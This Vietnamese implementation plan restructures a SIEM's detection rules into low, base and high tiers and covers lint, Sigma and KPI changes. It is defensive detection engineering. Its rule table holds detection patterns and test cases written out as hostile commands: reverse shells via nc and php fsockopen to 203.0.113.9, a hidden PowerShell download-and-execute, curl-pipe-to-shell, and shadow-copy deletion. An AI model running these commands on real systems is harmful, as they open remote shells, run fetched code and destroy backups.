# Tái cấu trúc kho rule theo bậc (rộng/low → hẹp/high) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Chuyển 41 rule viết tay và lô SigmaHQ 1 sang mô hình phân bậc. Mỗi hành vi có tối đa 3 rule:
- `-L` low: bắt rộng, không loại trừ, chỉ cộng điểm RBA;
- rule gốc: medium/high, mở case;
- `-H`: hẹp, là bậc duy nhất được phản ứng tự động.

Nhờ vậy cách lách nhỏ chỉ đẩy phát hiện xuống bậc thấp hơn chứ không làm mất hẳn, còn bắt nhầm thì không gây phản ứng tự động.

**Architecture:**
- Không thêm trường YAML: họ rule suy từ mã (`WIN-005-L`, `WIN-005`, `WIN-005-H`), bậc suy từ `severity`.
- Lint (`detection/lint.py`) kiểm ràng buộc họ, tính bao hàm (bậc trên ⊆ bậc dưới, kiểm bằng ca test) và quy định chỉ bậc cao được phản ứng tự động.
- RBA đã sửa ở commit `0208bc9`: một event tính một lần, một rule tính một lần.
- Console, KPI và benchmark tách alert low ra khỏi phần việc của analyst.

**Tech Stack:** Python 3.14 (server/.venv), pytest, YAML rule engine riêng (`detection/rules.py`), bộ biên dịch Sigma (`ai/sigma.py`), console HTML thuần.

**Spec:** mục *Thiết kế* ngay dưới đây. Bản thiết kế chốt qua trao đổi 21–22/10/2026; số liệu đánh giá rule nằm trong memory `siem-xdr-rule-review-2026-10-21`.

## Global Constraints

- **Điều kiện bắt đầu:**
  - nhánh `feature/coverage-batch1` đã được commit; nó chứa `tools/sigmahq_import.py`, `rules/sigmahq/lo-01.yml` và `ai/sigma.py` có `windash`;
  - nhánh `worktree-rba-dedupe-tiering` (commit `0208bc9`) đã gộp vào;
  - làm trên nhánh mới `feature/rule-tiers` tách từ hai nhánh trên.
- **Lịch** (theo `ROADMAP.md`):
  - Task 1–12 trước **09/11/2026** (đóng băng tính năng);
  - Task 13 (đo, hiệu chỉnh, tài liệu) từ 09/11 đến 12/11, giai đoạn này chỉ sửa lỗi;
  - Task 10–12 trùng với tuần 3 của ROADMAP; nếu trễ thì dời sau v1.0 và giữ nguyên Task 1–9.
- **Hậu tố mã rule:**
  - chỉ có `-L` và `-H`;
  - `-L` bắt buộc là `low`; `-H` bắt buộc là `high` hoặc `critical`;
  - trong một họ, mức độ tăng chặt theo thứ tự L < gốc < H theo `SEVERITY_SCORE`;
  - các rule trong họ phải cùng `logsource` và cùng `type`;
  - có `-L` hoặc `-H` thì phải có rule gốc.
- **Rule `-L` mới** bắt đầu ở `mode: shadow` với `shadow_since` là ngày commit. Rule sinh ra do tách rule đang chạy chính thức (WIN-014, WIN-015) và mọi thay đổi `severity` của rule có sẵn thì có hiệu lực ngay.
- **Rule low dạng `match`** phải có `suppress: 3600` và `group_by` là trường mà nguồn log luôn có:
  - tiến trình, service, FIM: `[agent.id]`;
  - web, mạng: `[source.ip]`;
  - AUTH-004: `[source.ip]`; AUTH-005: `[user.name]`.
- **Không sửa tay `condition` của rule SigmaHQ** (header của `lo-01.yml`). Chỉ được đổi `severity`, `suppress`, `group_by`, `mode`.
- **Phản ứng tự động** (`block_ip`, `kill_process`, `isolate_host`, kể cả loại cần duyệt) chỉ được gắn với rule có `severity` từ high trở lên và không có rule `-H` cùng họ.
- **Loại trừ:** điều kiện loại trừ (`not`, `exceptions`, danh sách cho phép) chỉ được đặt ở rule có bậc `-L` không loại trừ nằm bên dưới. Đây là nguyên tắc viết rule, không do lint kiểm.
- Mỗi rule giữ đủ metadata bắt buộc (`RULES.md` mục 2.11), có ít nhất 1 ca dương và 1 ca âm, và qua `tools/rule_lint.py`.
- **Chạy test:** `cd server && D:/GSANM/BTL/siem-xdr/server/.venv/Scripts/python.exe -m pytest -q`. Venv chỉ có ở checkout chính nhưng dùng được từ mọi worktree. Lint: `python ../tools/rule_lint.py`, chạy bằng cùng python đó. Đường nền: `test_ai.py::test_approved_ai_rule_runs_in_shadow_then_promoted` đang fail sẵn vì phụ thuộc ngày chạy (`shadow_since` 13/10 nay đã quá 7 ngày); không tính lỗi này cho task nào.

## Review Focus

1. **Rule low có `group_by` mà event thật thiếu trường đó sẽ không bao giờ bắn, và không báo lỗi gì** (`RuleEngine._group` trả `None`). Ca test viết tay có thể đủ trường trong khi event qua parser thì không. Task 7 và Task 8 có test cho event đi qua parser thật.
2. **Alert low làm phồng KPI và danh sách "Đang mở".** Alert low không bao giờ được đóng nên chỉ số alert mỗi ca trực, MTTD và tỉ lệ làm giàu dữ liệu sẽ lệch. Task 5 có test.
3. **E2E tìm alert theo `startswith`**, nên `alert(admin, "WEB-001")` có thể nhận `WEB-001-L`, cho kết quả đạt giả hoặc fail giả. Task 5 sửa helper thành so khớp đúng mã.
4. **Wildcard trong playbook gắn nhầm bậc thấp vào phản ứng tự động** (vd ai đó thêm `LNX-*` vào playbook diệt tiến trình). Task 3 có test lint.
5. **`windash` với giá trị có hơn 3 dấu gạch** làm số biến thể bùng nổ, hoặc bị bỏ qua mà không báo. Task 4 có test: tối đa 3 vị trí, nhiều hơn thì báo `SigmaError`.

---

## Thiết kế

### Bậc

| Bậc | `severity` | Viết thế nào | SOAR | Tiêu chí bật chính thức (đo trên log lab ≥ 7 ngày, việc 1.4) |
|---|---|---|---|---|
| `-L` tín hiệu | low | hành vi kẻ tấn công thật sự dùng, rộng, **không loại trừ** | chỉ cộng RBA, không mở case, không thông báo, ẩn khỏi danh sách mặc định | trung bình ≤ 5 alert/ngày/máy |
| gốc | medium hoặc high (critical nếu không có `-H`) | rule hiện tại, sửa lỗi; được loại trừ khi có `-L` bên dưới | mở case (medium); thông báo (high) | < 5 alert/ngày và báo nhầm < 30% (tiêu chí chạy bóng hiện có) |
| `-H` chắc chắn | high hoặc critical | hẹp, gần như không báo nhầm | được phản ứng tự động | 0 báo nhầm trên mọi tập bình thường |

Hai mẫu viết bảo đảm bao hàm:
- `-L` = `any: [<điều kiện gốc không có phần loại trừ>, <phần mở rộng>]`;
- gốc = `all: [<điều kiện -L>, not: <loại trừ>]`.

### Bảng họ rule

Ghi chú cho bảng:
- "→" là thay đổi so với hiện tại.
- Regex viết theo cú pháp Python, chưa escape theo YAML.
- Các ca có dấu ✓ đã chạy thử qua engine thật ngày 22/10 (`proto_tiers.py`, 23/23 ca đúng, không regex nào bị cờ ReDoS, regex dài nhất 147 ký tự).

| Họ | Sau tái cấu trúc | Điều kiện | Ca test thêm (dương / âm) |
|---|---|---|---|
| WIN-005 | `WIN-005-L` low, shadow | `all`: `event.category = process`; `any`[`process.name in [powershell.exe, pwsh.exe]`, `winlog.event_data.OriginalFileName in [PowerShell.EXE, pwsh.dll]`]; `process.command_line` regex `(^\|\s)[-/\u2013\u2014\u2015]e(c\|n[a-z]*)?\s+["']?[A-Za-z0-9+/=]{20,}` | dương ✓: `-ec`, `/enc`, `–EncodedCommand "…"`, lớp vỏ Ansible, `p.exe` có `OriginalFileName` = PowerShell.EXE. Âm ✓: `-ex bypass -c Get-Process` |
| | `WIN-005` high → **medium** | điều kiện `-L` + giữ 2 vế `not` loại Ansible | dương: `-ec`, `/enc`, `–enc`. Âm: lớp vỏ Ansible (giữ test `test_pipeline.py:218`) |
| WIN-006 | `WIN-006-L` low, shadow | process_creation, PowerShell (như WIN-005) + regex `downloadstring\|downloadfile\|downloaddata\|invoke-webrequest\|\biwr\b\|invoke-restmethod\|\birm\b\|net\.webclient\|start-bitstransfer` | dương: lệnh cài Chocolatey. Âm: `powershell -c Get-Date` |
| | `WIN-006` critical → **medium**, `logsource` → process_creation | điều kiện `-L` + `any`[`\b(iex\|invoke-expression)\b`, `[-/\u2013\u2014\u2015]w(indowstyle)?\s+h(idden)?`, `executionpolicy\s+bypass\|[-/]ep?\s+bypass`] + `not` regex `https://community\.chocolatey\.org/install\.ps1` | dương: `-w hidden -nop -c "iex(iwr http://203.0.113.9/a)"`, đảo thứ tự `-nop -w hidden`. Âm: lệnh cài Chocolatey |
| | **`WIN-014`** critical, active (mới, tách từ WIN-006) | logsource `ps_script`; `powershell.script_block` regex [`invoke-mimikatz`, `amsiutils\|amsiinitfailed`, `invoke-shellcode`, `frombase64string\(.*\)\s*\|\s*iex`] | dương: 4104 có `Invoke-Mimikatz`. Âm: 4104 có `DownloadString('https://community.chocolatey.org/install.ps1')` |
| WIN-007 | `WIN-007-L` low, shadow | `any`[điều kiện gốc, `process.command_line` regex [`\bprocdump(64)?(\.exe)?["']?\s.*[-/]ma\b`, `\bminidump`]] | dương: `procdump.exe -accepteula -ma 672 out.dmp`. Âm: `procdump -h` |
| | `WIN-007` critical, giữ playbook diệt tiến trình | bỏ nhánh `process_access`; giữ regex dòng lệnh và `process.name = mimikatz.exe` | giữ ca cũ |
| | **`WIN-015`** medium, active (mới, tách từ WIN-007) | logsource `process_access`; nhánh `process_access` cũ của WIN-007; không phản ứng tự động | dương: GrantedAccess `0x1410` vào lsass. Âm: `0x1000` |
| WIN-008 | `WIN-008` high | tiến trình cha thêm `onenote.exe`; tiến trình con thêm `msbuild.exe`, `certutil.exe`, `bitsadmin.exe`, `schtasks.exe`, `hh.exe` | dương: onenote.exe → cmd.exe |
| WIN-009 | `WIN-009-L` low, shadow | `event.action = service_installed` | dương: service bất kỳ. Âm: event 7036 |
| WIN-010 | `WIN-010` critical | regex [`vssadmin(\.exe)?["']?\s+(delete\s+shadows\|resize\s+shadowstorage)`, `wmic(\.exe)?["']?\s+shadowcopy\s+delete`, `win32_shadowcopy.*(\.delete\(\|remove-)`, `bcdedit(\.exe)?["']?.*recoveryenabled\s+no`, `wbadmin(\.exe)?["']?\s+delete\s+(catalog\|systemstatebackup)`] | dương: đường dẫn trong ngoặc kép, `resize shadowstorage`, WMI qua PowerShell |
| | `WIN-010-L` low, shadow | `any`[gốc, regex `\b(vssadmin\|wbadmin\|bcdedit\|diskshadow)(\.exe)?\b\|win32_shadowcopy`] | dương: `vssadmin list shadows`. Âm: `notepad.exe` |
| WIN-012 | `WIN-012` high → **medium** | regex chấp nhận windash và ngoặc kép: [`certutil(\.exe)?["']?.*[-/]urlcache.*(http\|ftp)`, `certutil(\.exe)?["']?.*[-/]decode`, `mshta(\.exe)?["']?\s+["']?(http\|javascript\|vbscript)`, `regsvr32(\.exe)?["']?.*[-/]i:(http\|ftp)`, `rundll32(\.exe)?["']?.*javascript:`, `bitsadmin(\.exe)?["']?.*[-/]transfer`] | dương: `certutil /urlcache …`, `"mshta.exe" "http://…"`. Âm: `certutil -hashfile a.exe SHA256` |
| | `WIN-012-L` low, shadow | `any`[gốc, `all`[`process.name in [certutil.exe, mshta.exe, regsvr32.exe, bitsadmin.exe]`, regex `(https?\|ftp)://`]] | dương: `certutil -verifyctl -f http://…`. Âm: như gốc |
| WIN-013 | `WIN-013-L` low, shadow | `any`[gốc, `all`[`process.name = schtasks.exe`, regex `[-/]create`]] | dương: tác vụ sao lưu `C:\Scripts\backup.cmd` (gốc im) |
| WIN-003 | medium → **low** | giữ điều kiện; thêm `suppress`, `group_by: [agent.id]` | giữ ca cũ, thêm `agent.id` vào event |
| WIN-004 | `WIN-004` high | `any`[`group.id in [S-1-5-32-544, S-1-5-32-555]`, `group.id` regex `-(512\|518\|519)$`]; bỏ so theo tên | dương: Administratoren (S-1-5-32-544). Âm: Hyper-V Administrators (S-1-5-32-578) |
| LNX-001 | `LNX-001` critical | sửa vế nc thành `\bnc(at)?\b.*\s-[ec]\s+\S*sh\b`; thêm [`php\s+-r.*fsockopen`, `perl\s+-e.*socket`, `ruby\s+-rsocket`] | dương: `nc 203.0.113.9 4444 -e sh`, `php -r '$sock=fsockopen(…)'` |
| | `LNX-001-L` low, shadow | `any`[gốc, regex [`/dev/(tcp\|udp)/`, `\b(nc\|ncat\|netcat\|socat)\b`, `fsockopen\|socket\.socket\|TCPSocket`, `\bmkfifo\b`]] | dương: `nc -zv 10.0.0.5 22`. Âm: `ls -la` |
| LNX-002 | `LNX-002` critical, giữ playbook diệt tiến trình | tiến trình cha còn [apache2, httpd, nginx, php-fpm, lighttpd] (bỏ `java`, `php`, `tomcat`) | âm: java → `sh -c ./gradlew build`. E2E bước cmdi giữ nguyên |
| | `LNX-002-L` low, shadow | `any`[gốc, `all`[tiến trình cha `in [java, php, tomcat, node, python3, gunicorn, uwsgi]`, tiến trình con như gốc]] | dương: java → sh |
| LNX-003 | `LNX-003-L` low, shadow | regex [`\b(curl\|wget)\b[^\|;&]*` + `INTERP`, `` (\$\(\|`\|<\()\s*(curl\|wget)\b ``, `TMP`] với `INTERP` = `\|\s*(sudo\s+)?(\S*/)?((ba\|da\|z\|k)?sh\|python[0-9.]*\|perl\|ruby\|php\|node)\b`, `TMP` = `\b(curl\|wget)\b.*\s(-O\|-o\|--output)\s*\S*(/tmp/\|/dev/shm/).*chmod\s+\S*x` | dương ✓: `get.docker.com.evil.io`, `get.docker.com` chính thức, `\| sudo bash`, `bash -c "$(curl …)"`, `\| python3`. Âm ✓: `curl … \| jq`, `curl -o /tmp/a.tar.gz …` |
| | `LNX-003` high → **medium** | `all`[điều kiện `-L`, `not` regex [`\b(curl\|wget)\s(?:[^\|:]\|:(?!//))*://(get\.docker\.com\|sh\.rustup\.rs\|get\.k3s\.io\|install\.python-poetry\.org\|deb\.nodesource\.com)(?=[/:'"\s\|]\|$)`, `\b(curl\|wget)\s(?:[^\|:]\|:(?!//))*://raw\.githubusercontent\.com/(nvm-sh/nvm\|homebrew/install\|ohmyzsh/ohmyzsh\|helm/helm)/`]]. Danh sách cho phép chỉ xét URL đầu tiên sau curl/wget và neo hết tên miền | dương ✓: `get.docker.com.evil.io`, `?r=://get.docker.com`, `\| sudo bash`, `$(curl …)`, bài Atomic trên GitHub, `wget -O /tmp/x … && chmod +x`. Âm ✓: docker, nvm, ohmyzsh chính thức |
| LNX-005 | medium → **low** | giữ (threshold) | giữ ca cũ |
| LNX-006 | `LNX-006` high → **medium** | giữ | giữ |
| | `LNX-006-L` low, shadow | `any`[gốc, regex [`authorized_keys`, `\bcrontab\s+(?!-l\b)`, `/etc/cron`, `systemctl\s+enable`, `/etc/systemd/system/`]] | dương: `echo key >> ~/.ssh/authorized_keys`. Âm: `crontab -l` |
| WEB-001 | `WEB-001-L` low, shadow | `any`[gốc, `url.decoded` regex [`\b(union\|select\|sleep\|benchmark\|waitfor\|xp_cmdshell\|information_schema)\b`, `['"]\s*(or\|and\|;\|--)`]] | dương: `?id=1' or 'a'='a`. Âm: `/index.html` |
| WEB-003 | `WEB-003-L` low, shadow | `any`[gốc, `url.decoded` regex [`\.\./`, `\.\.\\`, `/etc/`, `\\windows\\`], `url.original` regex `%2e%2e\|%252e`] | dương: `/img?f=../a.png`. Âm: `/a/b.png` |
| WEB-004 | `WEB-004` critical | thêm `url.decoded` regex `\$\{\s*(jndi\|\$\{)`; thêm vế `user_agent.original` regex `\$\{\s*(jndi\|\$\{)` | dương: `${${lower:j}ndi:ldap://…}` trong URL, `${jndi:…}` trong User-Agent |
| | `WEB-004-L` low, shadow | `any`[gốc, `url.decoded` regex `\$\{`, `user_agent.original` regex `\$\{`] | dương: `?q=${name}` (gốc im) |
| WEB-005, WEB-006 | medium → **low** | giữ; `suppress` của WEB-005 từ 300 lên 3600 | giữ |
| WEB-007 | `WEB-007` high | `url.path` regex `(^\|/)(login\|signin\|logon\|wp-login\.php\|user/login\|admin/login\|account/login)(\.php\|\.aspx?\|\.jsp\|/)?$` | âm: 10× POST `/oauth/token` |
| AUTH-004, AUTH-005 | medium → **low** | giữ; `group_by` lần lượt là `[source.ip]`, `[user.name]` | giữ |
| AUTH-006 | `AUTH-006` medium | bỏ vế `outcome = failure`; vế dòng lệnh thành regex `^\s*(-[is]\s*$\|(\S*/)?(ba\|z\|da\|k)?sh\b\|(\S*/)?su(\s+-)?\s*$)` | dương: `-s`, `bash`. Âm: gõ sai mật khẩu 1 lần |
| | **`AUTH-007`** low, shadow, threshold (mới) | `event.action = sudo` và `event.outcome = failure`; `threshold: {count: 3, window: 300, group_by: [user.name]}` | dương: 3 lần sai. Âm: 1 lần sai |
| NET-001 | `NET-001` medium | thêm `source.ip_scope = private` | âm: nguồn public |
| | `NET-001-L` low, shadow, threshold | điều kiện cũ (mọi nguồn) | dương: nguồn public |
| NET-002 | medium → **low** | giữ | giữ |
| NET-004 | `NET-004-L` low, shadow | `event.category = intrusion_detection` và `suricata.severity <= 3` | dương: severity 3 |
| FIM-001 | `FIM-001` high → **medium**, vẫn chạy bóng (việc 1.1) | giữ | giữ |
| | `FIM-001-L` low, shadow | `any`[gốc, `file.path` regex [`^/(root\|home/[^/]+)/\.(bashrc\|bash_profile\|profile\|zshrc)$`, `^/etc/(bash\.bashrc\|environment\|ld\.so\.conf\.d/\|update-motd\.d/\|xdg/autostart/\|init\.d/)`, `^/(usr/)?lib/systemd/system/`, `/\.config/(systemd/user\|autostart)/`], `registry.path` regex [`\\winlogon\\(userinit\|shell)$`, `\\image file execution options\\`, `\\policies\\explorer\\run$`]] | dương: `/home/u/.bashrc`. Âm: `/home/u/notes.txt` |
| WIN-001, WIN-002, WIN-011, WEB-002, WEB-008, WEB-009, AUTH-001/002/003, LNX-004, NET-003, NET-005, TI-001 | giữ nguyên | | |

Tổng cộng thêm 20 rule (17 rule `-L`, cùng WIN-014, WIN-015, AUTH-007); 13 rule có sẵn đổi `severity`:
- WIN-003, 005, 006, 012;
- LNX-003, 005, 006;
- WEB-005, 006;
- AUTH-004, 005;
- NET-002;
- FIM-001.

### SigmaHQ

- **Khi nhập thì hạ một bậc:** SigmaHQ medium → low, high → medium, critical → high. Rule low không cần case playbook riêng, nên các rule bị loại vì "kỹ thuật chưa có case playbook riêng" (337 rule, `RULES.md` mục 4.5) nhập được ở bậc low.
- **`--ids`:** nhập đích danh theo `id` của rule Sigma, không cần bắt thêm mẫu dataset nào. Vẫn phải biên dịch được, qua lint và không báo nhầm.
- **Lô thay thế:** gồm các rule đã bắt được biến thể ngày 21/10:
  - "Shadow Copies Deletion Using Operating Systems Utilities";
  - "Deletion of Volume Shadow Copies via WMI with PowerShell";
  - "Suspicious Encoded PowerShell Command Line";
  - "Suspicious PowerShell Encoded Command Patterns";
  - "Potential Defense Evasion Via Rename Of Highly Relevant Binaries";
  - "Remotely Hosted HTA File Executed Via Mshta.EXE";
  - "Suspicious File Downloaded From Direct IP Via Certutil.EXE";
  - "Suspicious Microsoft OneNote Child Process";
  - "Procdump Execution".
- **`windash`:** làm như pySigma: 5 ký tự (`-`, `/`, U+2013, U+2014, U+2015), sinh hoán vị cho mọi vị trí dấu gạch ở đầu cờ, tối đa 3 vị trí; nhiều hơn thì báo `SigmaError`.

---

## Task 1: Lint — mã có hậu tố và ràng buộc họ

**Files:**
- Modify: `server/siem/detection/lint.py` (`ID_RE`, `RuleInfo`, `lint()`, thêm `family_of`, `_families`)
- Test: `server/tests/test_rule_lint.py`

**Interfaces:**
- Produces:
  - `family_of(rule_id: str) -> tuple[str, str]`: trả `(mã gốc, hậu tố)`, hậu tố là `""`, `"L"` hoặc `"H"`; ví dụ `family_of("WIN-005-L") == ("WIN-005", "L")`;
  - `RuleInfo.severity: str` (mặc định `"medium"`);
  - `lint()` giữ `docs: dict[str, dict]` (YAML gốc theo id) và gọi `_families(rep, docs)` trước `_playbooks`.

- [ ] **Step 1: Viết test fail.**
  - Thêm vào `test_check_rule_reports_each_problem` ca `({"id": "WIN-005-X"}, "id phải dạng")`.
  - Thêm `test_check_rule_accepts_tier_suffix`: `check_rule(GOOD | {"id": "TST-001-L", "severity": "low"}, "x", False) == []`.
  - Thêm `test_lint_checks_tier_family(tmp_path)` theo mẫu `test_lint_requires_positive_and_negative_cases_that_pass`: một thư mục rule tạm có `TST-001` (medium) và lần lượt từng biến thể dưới đây; mỗi biến thể phải sinh đúng một lỗi chứa chuỗi tương ứng:
    - `TST-001-L` severity medium → `"-L phải là low"`;
    - `TST-001-H` severity medium → `"-H phải là high hoặc critical"`;
    - `TST-002-L` khi không có `TST-002` → `"thiếu rule gốc TST-002"`;
    - `TST-001-L` low nhưng khác `logsource` → `"cùng logsource"`;
    - `TST-001-L` low nhưng `type: threshold` → `"cùng type"`;
    - `TST-001-H` high trong khi gốc là high → `"thứ tự mức độ"`.
- [ ] **Step 2: Chạy, xác nhận fail.** `pytest tests/test_rule_lint.py -q`. Kỳ vọng: fail vì `ID_RE` từ chối `TST-001-L`.
- [ ] **Step 3: Cài đặt.**
  - `ID_RE = re.compile(r"^[A-Z]{2,5}-\d{3,}(-[LH])?$")`.
  - Viết `family_of` và `_families(rep, docs)`. Thứ tự mức độ so bằng `SEVERITY_SCORE`; so `logsource` bằng `==` trên dict.
- [ ] **Step 4: Chạy lại.** `pytest tests/test_rule_lint.py -q`. Kỳ vọng: PASS, và `test_repository_rules_pass_lint` vẫn đạt vì kho hiện chưa có hậu tố nào.
- [ ] **Step 5: Commit** `lint: mã rule có hậu tố -L/-H, ràng buộc họ rule phân bậc`.

## Task 2: Lint — bao hàm giữa các bậc, và quy định riêng cho rule low

**Files:**
- Modify: `server/siem/detection/lint.py` (`_cases`, `_playbooks`, `check_rule`)
- Test: `server/tests/test_rule_lint.py`

**Interfaces:**
- Consumes: `family_of`, `RuleInfo.severity`, `docs` từ Task 1; `run_case(rule, case) -> Result` (`ruletest.py:94`; `Result.fired` là số lần chính rule đó bắn).
- Produces: thông điệp lỗi `"bậc dưới phải phủ bậc trên"`, `"rule low phải có suppress"`.

- [ ] **Step 1: Viết test fail.**
  - `test_lint_lower_tier_must_cover_upper_tier(tmp_path)`: `TST-001` bắt `process.name = nc`, `TST-001-L` bắt `process.name = ncat`, có ca dương `nc` cho TST-001. Kỳ vọng một lỗi chứa `"bậc dưới phải phủ bậc trên"` và tên ca.
  - `test_low_rule_needs_no_case_playbook(tmp_path)`: rule low có kỹ thuật chưa có playbook riêng thì không sinh lỗi playbook.
  - `test_low_match_rule_requires_suppress_and_group_by`: `check_rule(GOOD | {"severity": "low"}, …)` có lỗi chứa `"rule low phải có suppress"`; thêm `suppress: 3600, group_by: [agent.id]` thì hết lỗi.
- [ ] **Step 2: Chạy, xác nhận cả 3 test fail.**
- [ ] **Step 3: Cài đặt.**
  - Trong `_cases`, với mỗi ca `expect == "alert"` của rule X, và mỗi rule Y cùng họ có mức độ thấp hơn X: nếu `run_case(compiled[Y], case).fired == 0` thì thêm lỗi.
  - `_playbooks` bỏ qua rule có `severity == "low"`.
  - `check_rule`: rule `low` có `type: match` bắt buộc có `suppress >= 600` và `group_by` không rỗng.
- [ ] **Step 4: Chạy `pytest tests/test_rule_lint.py -q`.** Kỳ vọng: PASS.
- [ ] **Step 5: Commit** `lint: bậc dưới phải phủ bậc trên; rule low không cần case playbook, bắt buộc có suppress`.

## Task 3: Lint — chỉ bậc cao nhất được phản ứng tự động

**Files:**
- Modify: `server/siem/detection/lint.py` (thêm `_auto_response(rep, docs, config_dir)`, gọi trong `lint()`)
- Test: `server/tests/test_rule_lint.py`

**Interfaces:**
- Consumes:
  - `RuleInfo.severity`, `family_of` và `docs` (lấy `tags`) từ Task 1;
  - `siem.soar.engine.load_playbooks(path) -> list[Playbook]`;
  - `Playbook.matches(alert: dict) -> bool`, dùng alert giả `{"rule": {"id": rid, "tags": tags}, "severity_score": SEVERITY_SCORE[sev], "alert": {"source": "rule"}}`;
  - `Playbook.steps: list[dict]`.
- Produces: thông điệp lỗi `"phản ứng tự động"`.

- [ ] **Step 1: Viết test fail.** `test_auto_response_only_on_top_tier(tmp_path)`, dùng `config/playbooks.yml` tạm có một playbook gồm bước `kill_process`, `rule_ids` lấy theo từng ca dưới đây. Lint phải báo lỗi chứa `"phản ứng tự động"` ở hai ca đầu và không báo ở ca cuối:
  - `rule_ids: ["TST-*"]`, kho có `TST-001` (high) và `TST-001-L` (low) → lỗi cho `TST-001-L`;
  - `rule_ids: ["TST-001"]`, kho có `TST-001` (high) và `TST-001-H` (critical) → lỗi cho `TST-001`;
  - `rule_ids: ["TST-001-H"]`, kho như ca 2 → không lỗi.
- [ ] **Step 2: Chạy, xác nhận fail.**
- [ ] **Step 3: Cài đặt `_auto_response`.**
  - Hằng `AUTO_ACTIONS = {"block_ip", "kill_process", "isolate_host"}`.
  - Duyệt từng playbook có ít nhất một bước thuộc `AUTO_ACTIONS`; xét mọi rule trong `rep.rules` mà `matches` trả `True`.
  - Lỗi khi `SEVERITY_SCORE[sev] < 3`, hoặc khi tồn tại `<họ>-H` mà rule đang xét không phải `-H`.
- [ ] **Step 4: Chạy `pytest tests/test_rule_lint.py -q` và `python ../tools/rule_lint.py`.** Kỳ vọng: PASS; kho hiện tại không có lỗi mới.
- [ ] **Step 5: Commit** `lint: phản ứng tự động chỉ gắn với rule high trở lên ở bậc cao nhất của họ`.

## Task 4: `windash` theo pySigma

**Files:**
- Modify: `server/siem/ai/sigma.py` (`_windash`, khoảng dòng 432)
- Test: `server/tests/test_sigma.py`

**Interfaces:** `_windash(value: str) -> list[str]` giữ nguyên chữ ký; nhiều hơn 3 vị trí thì `raise SigmaError`.

- [ ] **Step 1: Viết test fail.**
  - `test_windash_all_dashes_all_positions`:
    - `len(_windash(" -nop -w hidden")) == 25`;
    - `" \u2014nop /w hidden" in _windash(" -nop -w hidden")`;
    - `set(_windash("-e")) == {"-e", "/e", "\u2013e", "\u2014e", "\u2015e"}`.
  - `test_windash_more_than_three_raises`: `pytest.raises(SigmaError)` với `" -a -b -c -d"`.
  - `test_windash_ignores_inner_hyphen`: `_windash("x-y") == ["x-y"]`. Chỉ dấu gạch đứng đầu chuỗi hoặc sau khoảng trắng/ngoặc kép mới là cờ, giữ đúng điều kiện hiện có.
- [ ] **Step 2: Chạy `pytest tests/test_sigma.py -q -k windash`.** Kỳ vọng: FAIL (hiện chỉ 3 ký tự, chỉ vị trí đầu).
- [ ] **Step 3: Cài đặt.** Tìm mọi vị trí cờ, rồi dùng `itertools.product` trên 5 ký tự.
- [ ] **Step 4: Chạy `pytest tests/test_sigma.py -q`.** Kỳ vọng: PASS. Chạy lại `python ../tools/sigmahq_import.py --zip D:/GSANM/BTL/siem-xdr/datasets/raw/sigma_all_rules.zip --datasets D:/GSANM/BTL/siem-xdr/datasets/processed` (không `--write`; dataset chỉ có ở checkout chính) và ghi số rule biên dịch được trước/sau vào thông điệp commit.
- [ ] **Step 5: Commit** `sigma: windash đủ 5 ký tự, mọi vị trí (tối đa 3) như pySigma`.

## Task 5: Alert low không vào phần việc của analyst (KPI, console, E2E)

**Files:**
- Modify: `server/siem/manager/kpi.py:74-75` (`must_not` thêm `{"term": {"severity": "low"}}`)
- Modify: `server/siem/manager/static/console.html` (`VIEWS.alerts.f.sev` và `fromRoute`)
- Modify: `tools/e2e_test.py:103-105` (helper `alert`)
- Test: `server/tests/test_kpi.py`

- [ ] **Step 1: Viết test fail.** Trong `test_kpi_values_and_grades`, đổi câu kiểm cuối thành `q["bool"]["must_not"] == [{"term": {"alert.shadow": True}}, {"term": {"severity": "low"}}]`.
- [ ] **Step 2: Chạy `pytest tests/test_kpi.py -q`.** Kỳ vọng: FAIL.
- [ ] **Step 3: Cài đặt.**
  - `kpi.py`: thêm điều kiện vào `must_not`.
  - `console.html`: mặc định `sev: ['critical', 'high', 'medium']`; `fromRoute` cũng đặt giá trị này thay cho `[]`. Analyst bấm chip "Thấp" để xem tín hiệu.
  - `e2e_test.py`: `alert()` so khớp đúng mã `a["rule"]["id"] == rule_id`. Cả 4 chỗ gọi hiện có (`WEB-001`, `LNX-002` ×2, `WZH-100100`, `WZH-553`) đều truyền mã đầy đủ, nên không cần giữ cách so tiền tố.
- [ ] **Step 4: Chạy `pytest tests/test_kpi.py -q`.** Kỳ vọng: PASS. Mở console bằng `tools/ui_test.py` (memory `siem-xdr-test-workflow`) và xác nhận danh sách Cảnh báo mặc định không còn alert low.
- [ ] **Step 5: Commit** `alert low (tín hiệu RBA) không tính vào KPI, ẩn khỏi danh sách mặc định; E2E so đúng mã rule`.

## Task 6: Báo cáo độ phủ theo bậc

**Files:**
- Modify: `server/siem/ai/benchmark.py` (thêm `--min-severity`, mặc định `low`)

- [ ] **Step 1: Cài đặt.** Thêm `ap.add_argument("--min-severity", choices=list(SEVERITY_SCORE), default="low")`, rồi lọc `rules = [r for r in rules if SEVERITY_SCORE[r.severity] >= SEVERITY_SCORE[a.min_severity]]` trước `ds.evaluate(rules)`. Đây là bộ lọc một dòng, không cần test riêng.
- [ ] **Step 2: Kiểm.** Ở checkout chính (dataset chỉ có ở đó), chạy `python -m siem.ai.benchmark --datasets ../datasets/processed --min-severity medium`. Kỳ vọng: số Windows bằng số trước khi chuyển bậc, vì hiện chưa có rule low.
- [ ] **Step 3: Commit** `benchmark: --min-severity để báo cáo độ phủ theo bậc`.

## Task 7: Họ thử nghiệm LNX-003

**Files:**
- Modify: `server/rules/linux.yml` (LNX-003, thêm LNX-003-L)
- Modify: `server/rules/cases/linux.yml`
- Test: `server/tests/test_pipeline.py`

**Interfaces:** Consumes: lint Task 1–3. Điều kiện và ca test lấy đúng theo dòng LNX-003 của bảng họ.

- [ ] **Step 1: Viết ca test trước.**
  - Ghi vào `rules/cases/linux.yml` mọi ca dương/âm ✓ của dòng LNX-003 cho cả hai rule. Event cần có `agent: {id: "001"}`.
  - Thêm `test_lnx003_tier_via_real_parser` vào `test_pipeline.py`: đưa `curl -s https://get.docker.com.evil.io/x | sh` qua cùng đường parser mà helper `proc(...)` của file này dùng; kỳ vọng cả `LNX-003-L` lẫn `LNX-003` cùng bắn.
- [ ] **Step 2: Chạy `python ../tools/rule_lint.py`.** Kỳ vọng: lỗi "rule LNX-003-L không tồn tại" và ca `get.docker.com.evil.io` của LNX-003 fail.
